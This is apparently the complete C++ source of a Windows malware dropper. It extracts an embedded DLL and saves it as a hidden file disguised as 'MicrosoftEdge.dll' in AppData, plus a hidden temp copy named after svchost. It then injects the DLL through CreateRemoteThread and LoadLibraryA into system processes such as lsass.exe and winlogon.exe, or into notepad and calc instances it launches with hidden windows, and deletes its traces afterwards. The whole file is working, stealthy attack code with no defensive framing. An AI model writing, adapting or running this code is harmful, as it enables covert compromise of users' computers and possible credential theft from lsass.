#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <fstream>
#include <ctime>
#include <shlobj.h>
#include <wchar.h>

#include "packed.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

static const wchar_t* SYSTEM_TARGETS[] = {
    L"explorer.exe", L"svchost.exe", L"winlogon.exe",
    L"services.exe", L"lsass.exe", L"spoolsv.exe",
    L"taskhost.exe", L"dwm.exe", L"wininit.exe", L"conhost.exe"
};
static const int NUM_SYSTEM_TARGETS =
    sizeof(SYSTEM_TARGETS) / sizeof(SYSTEM_TARGETS[0]);

static const wchar_t* USER_TARGETS[] = {
    L"notepad.exe", L"calc.exe", L"mspaint.exe", L"write.exe"
};
static const int NUM_USER_TARGETS =
    sizeof(USER_TARGETS) / sizeof(USER_TARGETS[0]);

static std::string GetRoamingPath() {
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path) == S_OK)
        return std::string(path);
    return "";
}

static bool SaveDLLToRoaming() {
    std::string roamingPath = GetRoamingPath();
    if (roamingPath.empty()) return false;

    std::string dllPath = roamingPath + "\\MicrosoftEdge.dll";

    std::vector<BYTE> dllData = GetDLLData();
    if (dllData.empty()) return false;

    std::ofstream file(dllPath, std::ios::binary);
    if (!file) return false;

    file.write((char*)dllData.data(), dllData.size());
    file.close();

    SetFileAttributesA(dllPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    return true;
}

static std::string CreateTempDLL() {
    std::vector<BYTE> dllData = GetDLLData();
    if (dllData.empty()) return "";

    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    sprintf_s(tempFile, "%s\\svchost_%d.tmp", tempPath, GetCurrentProcessId());

    std::ofstream file(tempFile, std::ios::binary);
    if (!file) return "";

    file.write((char*)dllData.data(), dllData.size());
    file.close();

    SetFileAttributesA(tempFile, FILE_ATTRIBUTE_HIDDEN);
    return std::string(tempFile);
}

static DWORD FindProcessId(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, processName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

static bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin == TRUE;
}

static bool InjectDLL(DWORD pid, const std::string& dllPath) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProcess) return false;

    size_t pathSize = dllPath.length() + 1;
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_READWRITE);
    if (!remoteMem) { CloseHandle(hProcess); return false; }

    if (!WriteProcessMemory(hProcess, remoteMem, dllPath.c_str(),
                            pathSize, NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    FARPROC loadLibFar = GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                        "LoadLibraryA");
    if (!loadLibFar) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)loadLibFar,
                                        remoteMem, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, 10000);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return true;
}

static bool StartHiddenProcess(const wchar_t* exeName, DWORD& pid) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessW(exeName, NULL, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }

    pid = pi.dwProcessId;
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

static void Cleanup(const std::string& path) {
    if (path.empty()) return;
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    DeleteFileA(path.c_str());
}

static bool InjectToSystemProcesses(const std::string& dllPath) {
    for (int i = 0; i < NUM_SYSTEM_TARGETS; i++) {
        DWORD pid = FindProcessId(SYSTEM_TARGETS[i]);
        if (pid != 0) {
            if (InjectDLL(pid, dllPath)) return true;
        }
        Sleep(300);
    }
    return false;
}

static bool InjectToUserProcess(const std::string& dllPath) {
    for (int i = 0; i < NUM_USER_TARGETS; i++) {
        DWORD pid = 0;
        if (StartHiddenProcess(USER_TARGETS[i], pid)) {
            Sleep(2000);
            if (InjectDLL(pid, dllPath)) return true;
        }
    }
    return false;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    SaveDLLToRoaming();

    std::string tempDLL = CreateTempDLL();
    if (tempDLL.empty()) return 0;

    bool admin = IsAdmin();
    bool injected = false;

    if (admin) {
        injected = InjectToSystemProcesses(tempDLL);
        if (!injected) injected = InjectToUserProcess(tempDLL);
    } else {
        injected = InjectToUserProcess(tempDLL);
        if (!injected) injected = InjectToSystemProcesses(tempDLL);
    }

    Cleanup(tempDLL);
    return 0;
}